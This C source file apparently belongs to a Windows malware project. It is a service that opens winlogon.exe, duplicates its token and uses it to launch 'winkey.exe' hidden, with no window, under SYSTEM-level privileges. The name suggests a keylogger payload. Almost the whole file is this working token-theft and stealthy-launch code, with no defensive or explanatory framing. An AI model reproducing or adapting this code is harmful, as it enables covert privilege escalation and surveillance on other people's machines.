#include "tinky.h"

SERVICE_STATUS          g_status;
HANDLE                  g_stopEvent;
SERVICE_STATUS_HANDLE   g_statusHandle;

STARTUPINFOA        si = {0};
PROCESS_INFORMATION pi = {0};

HANDLE get_process_handle(char *name) {
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE hret = NULL;
    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hsnap, &pe32)) {
        CloseHandle(hsnap);
        return NULL;
    }
    while (Process32Next(hsnap, &pe32)) {
        if (!_stricmp(pe32.szExeFile, name)) {
            hret = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            return (CloseHandle(hsnap), hret);
        }
    }
    return (CloseHandle(hsnap), hret);
}

void WINAPI ServiceCtrlHandler(DWORD control) {
    if (control == SERVICE_CONTROL_STOP) {
        if (pi.hProcess) {
            TerminateProcess(pi.hProcess, 0);
            WaitForSingleObject(pi.hProcess, 5000);
        }
        g_status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_statusHandle, &g_status);
        SetEvent(g_stopEvent);
    }
}

void    error_sc(int code) {
    g_status.dwCurrentState = SERVICE_STOPPED;
    g_status.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
    g_status.dwServiceSpecificExitCode = code;
    SetServiceStatus(g_statusHandle, &g_status);
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    (void)argc;
    g_statusHandle = RegisterServiceCtrlHandler(TEXT(SC_NAME), ServiceCtrlHandler);
    g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwCurrentState = SERVICE_START_PENDING;
    g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    SetServiceStatus(g_statusHandle, &g_status);

    //GET TOKEN WINLOGON

    HANDLE hsys = get_process_handle("winlogon.exe");
    if (!hsys) {
        error_sc(1);
        return ;
    }

    HANDLE htoken = NULL;
    if (!OpenProcessToken(hsys, TOKEN_ALL_ACCESS, &htoken)) {
        CloseHandle(hsys);
        error_sc(2);
        return ;
    }

    HANDLE hduptoken = NULL;
    if (!DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hduptoken)) {
        CloseHandle(hsys);
        CloseHandle(htoken);
        error_sc(3);
        return ;
    }

    si.cb = sizeof(si);

    // ! chemin de winky.exe au lieu de argv[0]
    if (!CreateProcessAsUser(hduptoken, NULL, ".\\winkey.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, argv[0], &si, &pi)) {
        CloseHandle(hsys);
        CloseHandle(htoken);
        CloseHandle(hduptoken);
        error_sc(4);
        return ;
    }

    // CreateProcess(NULL, ".\\winkey.exe", NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
    g_status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_statusHandle, &g_status);
    WaitForSingleObject(g_stopEvent, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(htoken);
    CloseHandle(hduptoken);
    CloseHandle(hsys);
    g_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_statusHandle, &g_status);
}